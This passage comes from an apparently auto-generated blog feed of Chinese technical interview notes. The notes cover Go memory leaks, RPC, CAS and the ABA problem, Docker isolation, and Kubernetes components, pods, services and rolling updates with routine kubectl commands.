项目上线了，但是发现协程/内存泄漏，如何处理</h2><p>1.goroutine泄漏。<br>2.有一些全局的数据结构意外的挂住了本该释放的对象，虽然goroutine已经退出了，但是这些对象并没有从这类数据结构中删除，导致对象一直被引用，无法被收回。<br>所以发现有内存泄漏的话，具体问题具体分析。</p><h2 id="RPC基础"><a href="#RPC基础" class="headerlink" title="RPC基础"></a>RPC基础</h2><p>讲一下RPC基础：</p><p>RPC的概念<br>RPC（Romote Procedure Call，远程过程调用），作为分布式系统中不同节点之间的通信方式，是分布式系统的基石之一，RPC不是具体的方法，而是一种解决不同服务之间调用的设计。</p><p>基于RPC开发的框架可以称为RPC框架，典型的有谷歌的gRPC、阿里的Dubbo、Facebook的Thrift等，当然成熟的RPC框架还会有服务注册与发现、服务治理、负载均衡等功能。</p><p>RPC的四个要素<br>Client<br>服务调用的发起方</p><p>Client Stub<br>用于存储要调用的服务器地址、以及将要请求的数据信息打包，通过网络请求发送给Server Stub，然后阻塞，直到接受到返回的数据，然后进行解析。</p><p>Server<br>Server，包含要调用的方法</p><p>Server Stub<br>用于接受Client Stub发送的请求数据包并进行解析，完成功能调用，最后将结果进行打包并返回给Client Stub。在没有接受到请求数据包时则处于阻塞状态。</p><p>封装了Client Stub和Server Stub后，从Client的角度来看，似乎和本地调用一样。从Server的角度看，似乎就是客户直接调用。</p><p>RPC的具体通信步骤<br>Client以类似本地调用的方式调Client Stub<br>Client Stub序列化生成消息，然后调用本地操作系统的通信模块， Stub阻塞<br>本地操作系统与远程Server进行通信，消息传输到远程操作系统<br>远程操作系统将消息传递给Server Stub<br>Server Stub进行反序列化，然后调用Server的对应方法<br>Server程序执行方法，将结果传递给Server Stub<br>Server Stub将结果进行序列化，然后传递给Server操作系统<br>Server操作系统将结果传递给Client<br>Client操作系统将其交给Client Stub， Stub从阻塞状态恢复<br>Client Stub对结果进行反序列化，并将值返回给Client程序<br>Client程序获得返回结果</p><h2 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h2><p>乐观锁的概念其实很简单，就是在操作一个共享变量时，我们先认为多个线程之间没有冲突</p><h3 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h3><p>CAS是乐观锁的一种实现，CAS全称是比较和替换，CAS的操作主要由以下几个步骤组成：</p><ol><li>先查询原始值</li><li>操作时比较原始值是否修改</li><li>如果修改，则操作失败，禁止更新操作，如果没有发生修改，则更新为新值<h3 id="CAS的缺点"><a href="#CAS的缺点" class="headerlink" title="CAS的缺点"></a>CAS的缺点</h3>CAS虽然在低并发量的情况下可以减少系统的开销，但是CAS也有一些问题：</li><li>CPU开销过大问题</li><li>ABA问题</li><li>只能针对一个共享变量<h3 id="CPU开销过大"><a href="#CPU开销过大" class="headerlink" title="CPU开销过大"></a>CPU开销过大</h3>在我们使用CAS时，如果并发量过大，我们的程序有可能会一直自旋，长时间占用CPU资源。<h3 id="ABA问题"><a href="#ABA问题" class="headerlink" title="ABA问题"></a>ABA问题</h3>假设有个共享变量J，原始值为1。</li><li>线程A读取变量J，值为1</li><li>线程B读取变量J，值为1</li><li>线程A变量J+1，CAS成功从1修改为2</li><li>线程C读取变量J，值为2</li><li>线程C将变量J-1，CAS成功从2修改为1</li><li>线程A通过CAS比较和替换，依然可以改为自己想修改的值<br>上述过程，线程B和C已经将变量J的值已经改变了，但是线程A无法发现，依然可以修改共享变量，这就产生了ABA问题。<h3 id="共享变量单一"><a href="#共享变量单一" class="headerlink" title="共享变量单一"></a>共享变量单一</h3>CAS操作单个共享变量的时候可以保证原子的操作，无法操作多个变量。<br>但是在JDK5之后，AtomicReference可以用来保证对象之间的原子性，我们可以把多个对象放入CAS中操作。<h3 id="如何防止CAS的ABA"><a href="#如何防止CAS的ABA" class="headerlink" title="如何防止CAS的ABA"></a>如何防止CAS的ABA</h3>四个字：加标志位（version）。<br>至于标志位可以是自增的数字，也可以是时间戳。通过标志位我们可以精确的知道每次修改。</li></ol><h2 id="go-python-java的协程区别"><a href="#go-python-java的协程区别" class="headerlink" title="go python java的协程区别"></a>go python java的协程区别</h2><h3 id="python协程特点"><a href="#python协程特点" class="headerlink" title="python协程特点"></a>python协程特点</h3><ol><li><p>单线程内切换，适用于IO密集型程序中，能够最大化IO多路复用的效果。</p></li><li><p>没法利用多核。</p></li><li><p>协程间彻底同步，不会并行。不须要考虑数据安全。</p></li><li><p>关键词yield</p><h3 id="go协程特点"><a href="#go协程特点" class="headerlink" title="go协程特点"></a>go协程特点</h3></li><li><p>协程间须要保证数据安全，好比经过channel或锁。</p></li><li><p>能够利用多核并行执行。</p></li><li><p>协程间不彻底同步，能够并行运行，具体要看channel的设计。</p></li><li><p>抢占式调度，可能没法实现公平。</p></li></ol><h2 id="性能排查"><a href="#性能排查" class="headerlink" title="性能排查"></a>性能排查</h2><ol><li>使用性能分析工具（如pprof）来获取详细的性能数据，了解哪些函数或代码段消耗了大量的时间。</li><li>检查缓存、连接、数据库等</li><li>日志里也可能有信息</li></ol>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes Tutorial</title>
      <link href="/2023/01/01/2023-01-01-%E9%9D%A2%E7%BB%8Fdockerk8s/"/>
      <url>/2023/01/01/2023-01-01-%E9%9D%A2%E7%BB%8Fdockerk8s/</url>
      
        <content type="html"><![CDATA[<h1 id="pod生命周期-Pending-Runing-Succeed-Failed-Unknown"><a href="#pod生命周期-Pending-Runing-Succeed-Failed-Unknown" class="headerlink" title="pod生命周期 Pending Runing Succeed Failed Unknown"></a>pod生命周期 Pending Runing Succeed Failed Unknown</h1><ul><li>Pending(挂起):API server已经创建pod，但是该pod还有一个或多个容器的镜像没有创建，包括正 在下载镜像的过程; </li><li>Running(运行中):Pod内所有的容器已经创建，且至少有一个容器处于运行状态、正在启动括正在重 启状态;</li><li>Succeed(成功):Pod内所有容器均已退出，且不会再重启; </li><li>Failed(失败):Pod内所有容器均已退出，且至少有一个容器为退出失败状态 </li><li>Unknown(未知):某于某种原因apiserver无法获取该pod的状态，可能由于网络通行问题导致<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1></li></ul><p><a href="https://zhuanlan.zhihu.com/p/571931032" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/571931032</a></p><h2 id="cgroup"><a href="#cgroup" class="headerlink" title="cgroup"></a>cgroup</h2><p>CGroups 全称control group，</p><ul><li>用来限定一个进程的资源使用，</li><li>由 Linux 内核支持，可以限制和隔离Linux进程组 (process groups) 所使用的物理资源，比如cpu，内存，磁盘和网络IO，是Linux container技术的物理基础。</li></ul><h2 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h2><ul><li><p>如果CGroup设计出来的目的是为了隔离上面描述的物理资源，那么namespace则用来隔离PID(进程ID),IPC,Network等系统资源。</p></li><li><p>将它们分配给特定的Namespace，每个Namespace里面的资源对其他Namespace都是透明的。</p></li><li><p>不同container内的进程属于不同的Namespace，彼此透明，互不干扰。</p><h2 id="unionFS（storage-driver：overlay2）"><a href="#unionFS（storage-driver：overlay2）" class="headerlink" title="unionFS（storage driver：overlay2）"></a>unionFS（storage driver：overlay2）</h2></li><li><p>unionFS可以把文件系统上多个目录(也叫分支)内容联合挂载到同一个目录下，而目录的物理位置是分开的</p></li><li><p>借助Linux的unionFS，宿主机只需要在磁盘上保存一份base镜像，内存中也只需要加载一份，就能被所有基于这个镜像的容器共享</p></li></ul><h1 id="k8s是什么"><a href="#k8s是什么" class="headerlink" title="k8s是什么"></a>k8s是什么</h1><p>K8S 负责自动化运维管理多个 Docker 程序的集群</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://amos-x.com/wp-content/uploads/2019/11/image.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="组件1-etcd"><a href="#组件1-etcd" class="headerlink" title="组件1 etcd"></a>组件1 etcd</h2><p>分布式键值存储，用于保存Kubernetes集群的所有重要信息，例如配置数据、状态信息等</p><h2 id="组件2-apiserver-kube-apiserver"><a href="#组件2-apiserver-kube-apiserver" class="headerlink" title="组件2 apiserver: kube-apiserver"></a>组件2 apiserver: kube-apiserver</h2><p>kube-apiserver是Kubernetes API的前端，提供了Kubernetes控制平面的统一接口</p><h2 id="组件3-controller-kube-controller-manager"><a href="#组件3-controller-kube-controller-manager" class="headerlink" title="组件3 controller: kube-controller-manager"></a>组件3 controller: kube-controller-manager</h2><p>kube-controller-manager负责管理控制器，这些控制器包括节点控制器、副本控制器、端点控制器等，它们负责保证系统的状态符合用户定义的期望状态</p><h2 id="组件4-scheduler-kube-scheduler"><a href="#组件4-scheduler-kube-scheduler" class="headerlink" title="组件4 scheduler: kube-scheduler"></a>组件4 scheduler: kube-scheduler</h2><p>kube-scheduler负责将Pod调度到具体的节点上，它考虑了诸如资源需求、硬件/软件约束等因素</p><h2 id="组件5-kubelet"><a href="#组件5-kubelet" class="headerlink" title="组件5 kubelet"></a>组件5 kubelet</h2><p>kubelet是每个节点上运行的代理，负责确保Pods按照规定运行 </p><h2 id="组件6-kube-proxy"><a href="#组件6-kube-proxy" class="headerlink" title="组件6 kube-proxy"></a>组件6 kube-proxy</h2><p>kube-proxy负责维护节点上的网络规则，使得服务可以被正确地路由</p><h2 id="组件7-container-runtime"><a href="#组件7-container-runtime" class="headerlink" title="组件7 container runtime"></a>组件7 container runtime</h2><p>容器运行时，比如docker，containerd</p><h2 id="组件8-container-advisor"><a href="#组件8-container-advisor" class="headerlink" title="组件8 container advisor"></a>组件8 container advisor</h2><p>是一个监控代理，用于收集容器资源使用情况和性能数据</p><h2 id="【面试题】一个网络请求来了，还没处理要怎么办"><a href="#【面试题】一个网络请求来了，还没处理要怎么办" class="headerlink" title="【面试题】一个网络请求来了，还没处理要怎么办"></a>【面试题】一个网络请求来了，还没处理要怎么办</h2><p>kube-proxy处理，负责集群内部外部流量，正确路由到正确的pod上，实现高可用</p><h2 id="1-etcd是什么？分布式键值存储系统"><a href="#1-etcd是什么？分布式键值存储系统" class="headerlink" title="1.etcd是什么？分布式键值存储系统"></a>1.etcd是什么？分布式键值存储系统</h2><h2 id="2-etcd适用场景是什么，"><a href="#2-etcd适用场景是什么，" class="headerlink" title="2.etcd适用场景是什么，"></a>2.etcd适用场景是什么，</h2><h2 id="1-简述K8s的工作流程"><a href="#1-简述K8s的工作流程" class="headerlink" title="1. 简述K8s的工作流程"></a>1. 简述K8s的工作流程</h2><ol><li>创建一个包含应用程序的Deployment的yml文件，然后通过kubectl客户端工具发送给ApiServer。</li><li>ApiServer接收到客户端的请求并将资源内容存储到数据库(etcd)中。</li><li>Controller组件(包含scheduler、replication、endpoint)监控资源变化并作出反应。</li><li>ReplicaSet检查数据库变化，创建期望数量的pod实例。</li><li>Scheduler再次检查数据库变化，发现尚未被分配到具体执行节点(Node)的Pod，然后根据一组相关规则将Pod分配到可以运行它们的节点(Node)上，并更新数据库，记录Pod分配情况。</li><li>Kubelet监控数据库变化，管理后续Pod的生命周期，发现被分配到它所在的节点上运行的那些Pod。如果找到新Pod，则会在该节点上运行这个新Pod。例如当有数据发送到主机时，将其路由到正确的pod或容器。<h2 id="2-简述控制器类型Deployment，StatefulSet，DaemonSet的区别"><a href="#2-简述控制器类型Deployment，StatefulSet，DaemonSet的区别" class="headerlink" title="2. 简述控制器类型Deployment，StatefulSet，DaemonSet的区别"></a>2. 简述控制器类型Deployment，StatefulSet，DaemonSet的区别</h2></li><li><strong>应用场景</strong><ul><li>Deployment适用于无状态的应用场景，副本可以动态增加和减少</li><li>StatefulSet适用于有状态的应用场景，副本要顺序启动停止</li><li>DaemonSet适用于每个节点都运行一个或多个pod的场景</li></ul></li><li><strong>存储</strong><ul><li>Deployment不需要特别的存储支持</li><li>StatefulSet需要为每个Pod提供独立的存储，这可以通过后端存储完成</li><li>DaemonSet的每个pod要挂载 volume<h2 id="3-简述一下k8s的存储管理"><a href="#3-简述一下k8s的存储管理" class="headerlink" title="3. 简述一下k8s的存储管理"></a>3. 简述一下k8s的存储管理</h2></li></ul></li></ol><ul><li>持久卷，持久卷声明（PV，PVC）：适用于持久化数据的应用，比如数据库</li><li>存储类（StroageClass），根据PVC动态创建PV，适用于需要动态创建存储的场景，如云存储、分布式存储</li><li>子路径卷 (Subpath Volume)，多个pod共享存储</li><li>本地卷（Local Volume），节点的本地卷映射到pod中，节点间共享存储<h2 id="4-如何实现滚动更新和回滚【实现平滑升级和故障恢复的手段】"><a href="#4-如何实现滚动更新和回滚【实现平滑升级和故障恢复的手段】" class="headerlink" title="4. 如何实现滚动更新和回滚【实现平滑升级和故障恢复的手段】"></a>4. 如何实现滚动更新和回滚【实现平滑升级和故障恢复的手段】</h2></li><li>滚动更新逐步将pod下线，由新deployment进行更新<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建pod副本,在执行Deployment和升级的时候最好带上record参数，便于查看历史版本信息。</span></span><br><span class="line">kubectl apply -f abcdocker-test.yaml  --record</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新1.替换镜像版本去更新</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 我们可以看到pod执行过程是等待新的pod启动完成，在进行销毁旧的pod，这样就完成了集群的更新工作我们可以看到pod执行过程是等待新的pod启动完成，在进行销毁旧的pod，这样就完成了集群的更新工作</span></span><br><span class="line">sed -i 's#1.13.0-alpine#1.10.0-alpine#g' abcdocker-test.yaml</span><br><span class="line">kubectl apply -f abcdocker-test.yaml --record</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新2.直接更新deployment【不是修改yaml文件】，要用kubctl edit deployment</span></span><br><span class="line">kubectl get deployment</span><br><span class="line">kubectl edit deployments deployment_name</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新3. kubctl <span class="built_in">set</span>替换镜像</span></span><br><span class="line">kubectl set image deployment/SVC_NAME -n namespace_name container_name=images:v1</span><br></pre></td></tr></table></figure></li></ul><p>回滚,使用 kubectl rollout</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl rollout history deployment [deployment_name]查看所有的history</span><br><span class="line">kubectl rollout undo deploy_name</span><br></pre></td></tr></table></figure><h2 id="5-如何进行日志管理"><a href="#5-如何进行日志管理" class="headerlink" title="5. 如何进行日志管理"></a>5. 如何进行日志管理</h2><ol><li>使用kubectl的logs，获取制定pod的日志<code>kubectl logs [pod_name]</code></li><li>修改Kube-proxy的配置文件，通常位于<code>/etc/kubernetes/manifests/kube-proxy.yaml</code>将Pod的日志输出到宿主机的日志文件中，一般使用本地卷挂载</li><li>重启kube-proxy，使用宿主机的日志轮转工具，logrotate，设置轮转策略<code>sudo logrotate -d /etc/logrotate.d/pod-logs</code><h2 id="6-如何进行监控管理"><a href="#6-如何进行监控管理" class="headerlink" title="6. 如何进行监控管理"></a>6. 如何进行监控管理</h2></li><li>k8s提供了一个metrics，访问这个http请求就返回一个表单，是以#开头的注释行和以指标名称为前缀的键值对</li><li>工具有Prometheus比较常用，Grafana进行可视化展示</li><li>使用Heapster对Kubernetes集群进行监控数据的采集和存储<h2 id="7-etcd的作用"><a href="#7-etcd的作用" class="headerlink" title="7. etcd的作用"></a>7. etcd的作用</h2></li><li>存储所有资源信息，保证数据的强一致性，作用是<strong>数据存储、配置管理、故障恢复</strong></li><li>这些资源信息包括：服务发现、分布式锁、分布式数据队列、分布式通知和协调等功能<h2 id="8-etc的基本原理"><a href="#8-etc的基本原理" class="headerlink" title="8. etc的基本原理"></a>8. etc的基本原理</h2></li><li>分布式存储：Etcd采用分布式存储方式，可以配置多节点群集，通过数据同步来保证数据可靠性。</li><li>高可用性：Etcd通过选举算法来保证在任何时候都有一个领导者节点负责数据的写入和更新，从而保证了数据的强一致性。</li><li>数据持久化：Etcd中的数据会定期进行持久化存储，即使在系统崩溃时也可以保证数据的完整性。<h2 id="9-k8s的kube-scheduler调度器"><a href="#9-k8s的kube-scheduler调度器" class="headerlink" title="9. k8s的kube-scheduler调度器"></a>9. k8s的kube-scheduler调度器</h2></li></ol><h2 id="10-k8s怎样负载均衡的"><a href="#10-k8s怎样负载均衡的" class="headerlink" title="10. k8s怎样负载均衡的"></a>10. k8s怎样负载均衡的</h2><ol><li>Kubernetes的内置负载均衡器：Service组件，Service会根据服务后端的Pod IP和端口，将流量均衡地转发给每个Pod。这种方式是基于IP的负载均衡，支持TCP和UDP协议。</li><li>用传统的Nginx负载均衡服务器做边车（Sidecar）容器运行，监控流量<h2 id="11-k8s的Labels和Selectors的作用"><a href="#11-k8s的Labels和Selectors的作用" class="headerlink" title="11. k8s的Labels和Selectors的作用"></a>11. k8s的Labels和Selectors的作用</h2></li></ol><p><strong>Label：用于标识和选择资源对象。</strong></p><ul><li>附加在资源对象上的键值对标签，标pod，service</li><li>标在资源上，可以供Selector进行服务发现，关联选择资源，监控日志等</li></ul><p><strong>Selector：用于选择资源，服务发现</strong></p><h2 id="12-k8s的Service是什么"><a href="#12-k8s的Service是什么" class="headerlink" title="12. k8s的Service是什么"></a>12. k8s的Service是什么</h2><p>Service为一组pod定义一个服务的入口地址，提供给前端用Ingress访问这个集群实例，可以起到服务发现，负载均衡，故障隔离的作用。</p><ol><li>提供服务的稳定入口：Service为前端的应用程序或者ingress提供了稳定的服务入口，这个入口拥有一个全局唯一的虚拟IP地址，前端的应用可以通过这个IP地址访问后端的Pod集群。</li><li>实现负载均衡：Service内部实现了负载均衡机制，它会将所有进入的请求均匀地分配给后端的Pod副本，确保每个请求都能得到正确的响应。</li><li>实现故障隔离：当某个Pod发生故障时，Service会自动将该Pod从服务池中剔除，保证请求不会被故障的Pod处理，从而实现了故障隔离。</li><li>实现服务发现：Service允许前端的应用程序通过Label Selector来找到提供特定服务的Pod，从而实现了服务的自动发现。</li></ol><h2 id="13-Pod是什么，简述生命周期"><a href="#13-Pod是什么，简述生命周期" class="headerlink" title="13. Pod是什么，简述生命周期"></a>13. Pod是什么，简述生命周期</h2><p>Pod由一个或多个容器组成。<br>周期：创建启动运行停止</p><h1 id="pod"><a href="#pod" class="headerlink" title="pod"></a>pod</h1><h2 id="1-pod的原理"><a href="#1-pod的原理" class="headerlink" title="1. pod的原理"></a>1. pod的原理</h2><h2 id="2-pod的特点"><a href="#2-pod的特点" class="headerlink" title="2. pod的特点"></a>2. pod的特点</h2><h2 id="3-pause容器作用"><a href="#3-pause容器作用" class="headerlink" title="3. pause容器作用"></a>3. pause容器作用</h2><h2 id="4-pod的重启策略"><a href="#4-pod的重启策略" class="headerlink" title="4. pod的重启策略"></a>4. pod的重启策略</h2><h2 id="5-pod的镜像拉取策略"><a href="#5-pod的镜像拉取策略" class="headerlink" title="5. pod的镜像拉取策略"></a>5. pod的镜像拉取策略</h2><h2 id="6-pod的存活探针有哪几种"><a href="#6-pod的存活探针有哪几种" class="headerlink" title="6. pod的存活探针有哪几种"></a>6. pod的存活探针有哪几种</h2><h2 id="7-存活探针的属性参数"><a href="#7-存活探针的属性参数" class="headerlink" title="7. 存活探针的属性参数"></a>7. 存活探针的属性参数</h2><h2 id="8-pod的就绪探针有哪几种"><a href="#8-pod的就绪探针有哪几种" class="headerlink" title="8. pod的就绪探针有哪几种"></a>8. pod的就绪探针有哪几种</h2><h2 id="9-就绪探针的属性参数"><a href="#9-就绪探针的属性参数" class="headerlink" title="9. 就绪探针的属性参数"></a>9. 就绪探针的属性参数</h2><h2 id="10-就绪探针和存活探针的区别是什么"><a href="#10-就绪探针和存活探针的区别是什么" class="headerlink" title="10.就绪探针和存活探针的区别是什么"></a>10.就绪探针和存活探针的区别是什么</h2><ul><li>存活探针是将检查失败的容器杀死，创建新的启动容器来保持pod正常工作</li><li>就绪探针是，当就绪探针检查失败，并不重启容器，而是将pod移出endpoint，<strong>就绪探针确保了service 中的pod都是可用的</strong>，确保客户端只与正常的pod交互并且客户端永远不会知道系统存在问题<h2 id="11-pod创建过程"><a href="#11-pod创建过程" class="headerlink" title="11. pod创建过程"></a>11. pod创建过程</h2></li></ul><ol><li><p>kubectl run 创建pod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、首先，用户通过kubectl或其他api客户端工具提交需要创建的pod信息给apiserver; </span><br><span class="line">2、apiserver验证客户端的用户权限信息，验证通过开始处理创建请求生成pod对象信息，并将信息存入 etcd，然后返回确认信息给客户端; </span><br><span class="line">3、apiserver开始反馈etcd中pod对象的变化，其他组件使用watch机制跟踪apiserver上的变动; </span><br><span class="line">4、scheduler发现有新的pod对象要创建，开始调用内部算法机制为pod分配最佳的主机，并将结果信息 更新至apiserver; </span><br><span class="line">5、node节点上的kubelet通过watch机制跟踪apiserver发现有pod调度到本节点，尝试调用docker启动 容器，并将结果反馈apiserver;</span><br><span class="line">6、apiserver将收到的pod状态信息存入etcd中。</span><br></pre></td></tr></table></figure></li><li><p>使用deployment创建pod</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、kubectl apply -f mydeployment.yaml</span><br><span class="line"></span><br><span class="line">2、api-server收到创建资源的请求后，会对客户端操作进行身份认证，在客户端的~/.kube文件夹下，已 经设置好了相关的用户认证信息，这样api-server会知道我是哪个用户，并对此用户进行鉴权，当api- server确定客户端的请求合法后，就会接受本次操作，并把相关的信息保存到etcd中，然后返回确认信 息给客户端。 </span><br><span class="line"></span><br><span class="line">3、apiserver开始反馈etcd中过程创建的对象的变化，其他组件使用watch机制跟踪apiserver上的变动。</span><br><span class="line"></span><br><span class="line">4、controller-manager组件会监听api-server的信息，controller-manager是有多个类型的，比如 Deployment Controller, 它的作用就是负责监听Deployment，此时Deployment Controller发现有新的deployment要创建，那么它就会去创建一个ReplicaSet，一个ReplicaSet的产生，又被另一个叫做 ReplicaSet Controller监听到了，紧接着它就会去分析ReplicaSet的语义，它了解到是要依照ReplicaSet 的template去创建Pod, 它一看这个Pod并不存在，那么就新建此Pod，当Pod刚被创建时，它的 nodeName属性值为空，代表着此Pod未被调度。 </span><br><span class="line"></span><br><span class="line">5、调度器Scheduler组件开始介入工作，Scheduler也是通过watch机制跟踪apiserver上的变动，发现 有未调度的Pod，则根据内部算法、节点资源情况，pod定义的亲和性反亲和性等等，调度器会综合的选 出一批候选节点，在候选节点中选择一个最优的节点，然后将pod绑定该该节点，将信息反馈给api- server。</span><br><span class="line"></span><br><span class="line">6、kubelet组件布署于Node之上，它也是通过watch机制跟踪apiserver上的变动，监听到有一个Pod应 该要被调度到自身所在Node上来，kubelet首先判断本地是否在此Pod，如果不存在，则会进入创建Pod 流程，创建Pod有分为几种情况，第一种是容器不需要挂载外部存储，则相当于直接docker run把容器 启动，但不会直接挂载docker网络，而是通过CNI调用网络插件配置容器网络，如果需要挂载外部存 储，则还要调用CSI来挂载存储。kubelet创建完pod，将信息反馈给api-server，api-servier将pod信息 写入etcd</span><br><span class="line"></span><br><span class="line">7、Pod建立成功后，ReplicaSet Controller会对其持续进行关注，如果Pod因意外或被我们手动退出， ReplicaSet Controller会知道，并创建新的Pod，以保持replicas数量期望值。</span><br></pre></td></tr></table></figure><h2 id="12-pod的终止过程"><a href="#12-pod的终止过程" class="headerlink" title="12.pod的终止过程"></a>12.pod的终止过程</h2><ol><li>用户向apiserver发送pod删除的命令</li><li>kubectl监控pod为terminating状态，就启动关闭pod过程</li><li>endpoint控制器监控pod对象的关闭行为时，讲所有资源从endpoint列表删除</li><li>如果当前pod对象定义了preStop钩子处理器，则在其被标记为terminating后会意同步的方式启动执行</li><li>pod对象容器进程收到了停止信息</li><li>宽限期过后，kubelet请求apiserver讲pod资源宽限期设0，对用户不可见<h2 id="13-pod的初始化容器-init-container"><a href="#13-pod的初始化容器-init-container" class="headerlink" title="13. pod的初始化容器 init container"></a>13. pod的初始化容器 init container</h2></li></ol><ul><li>负责在主应用容器启动之前执行一些预处理工作或者初始化任务，挂载volume，等待外部服务就绪，安全检查等<h2 id="14-pod的资源请求、限制如何定义"><a href="#14-pod的资源请求、限制如何定义" class="headerlink" title="14.pod的资源请求、限制如何定义"></a>14.pod的资源请求、限制如何定义</h2>resources下的limits和requests，cpu核数和内存大小<h1 id="service"><a href="#service" class="headerlink" title="service"></a>service</h1><h2 id="1-service如何与pod关联"><a href="#1-service如何与pod关联" class="headerlink" title="1. service如何与pod关联"></a>1. service如何与pod关联</h2>pod后跟了label，然后service使用标签选择器，selector选择关联哪些pod作为后段<h2 id="2-service的域名解析格式"><a href="#2-service的域名解析格式" class="headerlink" title="2. service的域名解析格式"></a>2. service的域名解析格式</h2><code>&lt;service-name&gt;.&lt;namespace&gt;.svc.&lt;cluster-domain&gt;</code></li><li><code>&lt;service-name&gt;</code> 是服务的名称，是在创建服务时指定的。</li><li><code>&lt;namespace&gt;</code> 是服务所在的命名空间，默认为 “default”。</li><li><code>&lt;cluster-domain&gt;</code> 是集群的域名，通常为 “cluster.local”。<h2 id="3-service的类型"><a href="#3-service的类型" class="headerlink" title="3. service的类型"></a>3. service的类型</h2></li></ul><p><strong>一般情况下service都是ClusterIP类型的，通过ingress接入的外部流量</strong></p><ol><li>ClusterIP：仅供集群内部使用，默认ClusterIP</li><li>NodePort：service可以对外访问应用，在每个节点暴露一个端口，外部访问任意NodeIP:port就可以脸上service</li><li>LoadBalancer：service对外访问应用，公有云环境下，需要公网IP地址</li><li>ExternalName:这种类型的service会把集群外部的服务引入集群内部，这样集群内直接访问service就 可以间接的使用集群外部服务了<h2 id="4-一个应用pod如何连接service"><a href="#4-一个应用pod如何连接service" class="headerlink" title="4. 一个应用pod如何连接service"></a>4. 一个应用pod如何连接service</h2></li><li>环境变量，配置注入</li><li>DNS方式，k8s集群内有DNS服务器<h2 id="5-如何创建一个service代理外部的服务-集群内的应用如何访问外部的数据库服务？"><a href="#5-如何创建一个service代理外部的服务-集群内的应用如何访问外部的数据库服务？" class="headerlink" title="5. 如何创建一个service代理外部的服务/集群内的应用如何访问外部的数据库服务？"></a>5. 如何创建一个service代理外部的服务/集群内的应用如何访问外部的数据库服务？</h2>创建一个没有标签选择器的service代理集群外部服务。</li><li>创建service时不指定selector，没了selector就不会自动创建endpoint</li><li>手动创建一个<strong>与service同名的</strong>endpoint，在这个endpoint里定义外部服务的IP和端口，然后就自动关联了<h2 id="6-service-endpoint-kubeproxy的关系"><a href="#6-service-endpoint-kubeproxy的关系" class="headerlink" title="6. service endpoint kubeproxy的关系"></a>6. service endpoint kubeproxy的关系</h2></li></ol><ul><li><strong>service</strong>:在kubernetes中，service是一种为一组功能相同的pod提供单一不变的接入点的资源。当 service被建立时，service的IP和端口不会改变，这样外部的客户端(也可以是集群内部的客户端)通过 service的IP和端口来建立链接，这些链接会被路由到提供该服务的任意一个pod上。通过这样的方式， 客户端不需要知道每个单独提供服务的pod地址，这样pod就可以在集群中随时被创建或销毁。 </li><li><strong>endpoint</strong>:service维护一个叫endpoint的资源列表，endpoint资源对象保存着service关联的pod的ip和 端口。从表面上看，当pod消失，service会在endpoint列表中剔除pod，当有新的pod加入，service就 会将pod ip加入endpoint列表;但是正在底层的逻辑是，endpoint的这种自动剔除、添加、更新pod的 地址其实底层是由endpoint controller控制的，endpoint controller负责监听service和对应的pod副本 的变化，如果监听到service被删除，则删除和该service同名的endpoint对象，如果监听到新的service 被创建或者修改，则根据该service信息获取得相关pod列表，然后创建或更新service对应的endpoint对 象，如果监听到pod事件，则更新它所对应的service的endpoint对象。 </li><li><strong>kube-proxy</strong>:kube-proxy运行在node节点上，在Node节点上实现Pod网络代理，维护网络规则和四层 负载均衡工作，kube-proxy会监听api-server中从而获取service和endpoint的变化情况，创建并维护路 由规则以提供服务IP和负载均衡功能。简单理解此进程是Service的透明代理兼负载均衡器，其核心功能 是将到某个Service的访问请求转发到后端的多个Pod实例上<h2 id="kubelet的功能和作用"><a href="#kubelet的功能和作用" class="headerlink" title="kubelet的功能和作用"></a>kubelet的功能和作用</h2></li></ul><ol><li>Node管理，kubelet启动时向kubeproxy注册，定时向apiserver汇报节点和资源状态</li><li>Pod管理，kubelet维护pod的生命周期，当kubelet监听到master的下发到自己节点的任务时，比如要创建、更新、删除一个pod，kubelet 就会通过CRI(容器运行时接口)插件来调用不同的容器运行时来创建、更新、删除容器。</li><li>容器健康检查。Pod中可以定义<strong>启动探针-存活探针-就绪探针</strong>，定期调用容器的探针检测Pod的生命周期，对失败的容器进行重启等操作</li><li>在Node上部署Metrics server进行资源监控<h2 id="kube-apiserver的功能和作用，端口号是8080和6443"><a href="#kube-apiserver的功能和作用，端口号是8080和6443" class="headerlink" title="kube-apiserver的功能和作用，端口号是8080和6443"></a>kube-apiserver的功能和作用，端口号是8080和6443</h2>在命名空间的kube-system命名空间里，有一个名称为kube-api-master的pod，这个pod就是运行着 